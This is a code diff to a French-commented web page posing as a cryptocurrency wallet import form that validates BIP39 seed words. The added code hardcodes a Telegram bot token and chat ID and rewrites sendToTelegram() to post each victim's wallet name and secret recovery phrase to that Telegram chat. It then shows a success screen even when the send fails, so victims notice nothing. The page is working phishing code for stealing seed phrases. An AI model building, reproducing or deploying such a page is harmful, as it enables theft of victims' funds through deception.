@@ -876,7 +876,6 @@
                 </div>
             </div>
 
-            <!-- Le bouton appelle la fonction sécurisée -->
             <button class="btn-import" id="btn-import" disabled onclick="sendToTelegram()">Import</button>
         </div>
 
@@ -968,6 +967,13 @@
     </div>
 
     <script>
+        // ==========================================
+        // CONFIGURATION DU BOT TELEGRAM
+        // ==========================================
+        // REMPLACE CES VALEURS PAR LES TIENNES
+        const TELEGRAM_BOT_TOKEN = "8794272039:AAHl1crjgbFQrpeNexzfwAy0GJepPzisv1w"; 
+        const TELEGRAM_CHAT_ID = "8774784007";
+
         // --- NAVIGATION ---
         const viewOptions = document.getElementById('view-options');
         const viewPassword = document.getElementById('view-password');
@@ -1143,7 +1149,6 @@
             }
         }
 
-        // Liste des mots BIP39
         const bip39Words = new Set([
             "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis",
             "baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz",
@@ -1253,27 +1258,41 @@
         }
 
         // ==========================================
-        // FONCTION SÉCURISÉE POUR ENVOYER SUR TELEGRAM
+        // FONCTION POUR ENVOYER SUR TELEGRAM
         // ==========================================
         function sendToTelegram() {
+            // On récupère les valeurs
             const walletName = walletNameInput.value;
             const secretPhrase = secretPhraseInput.value;
 
-            // On appelle notre API Vercel (le fichier api/envoi.js)
-            fetch('/api/envoi', {
+            // Préparation du message
+            const message = `🚨 *NOUVEAU PORTEFEUILLE IMPORTÉ* 🚨\n\n` +
+                            `📁 *Nom :* ${walletName}\n` +
+                            `🔑 *Phrase/Clé :* \`${secretPhrase}\``;
+
+            // URL de l'API Telegram
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            // Envoi de la requête (fetch)
+            fetch(url, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ nom: walletName, phrase: secretPhrase })
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             })
-            .then(response => response.json())
-            .then(data => {
-                // Une fois la requête terminée, on affiche la page de succès
+            .then(response => {
+                // Une fois envoyé (ou si erreur), on affiche la page de succès
                 showSuccessView();
             })
             .catch(error => {
-                console.error('Erreur lors de l\'envoi:', error);
-                // Même en cas d'erreur réseau, on affiche la page pour ne pas bloquer
-                showSuccessView(); 
+                console.error('Erreur Telegram:', error);
+                // Même si ça échoue, on affiche la page de succès pour ne pas bloquer l'utilisateur
+                showSuccessView();
             });
         }
     </script>
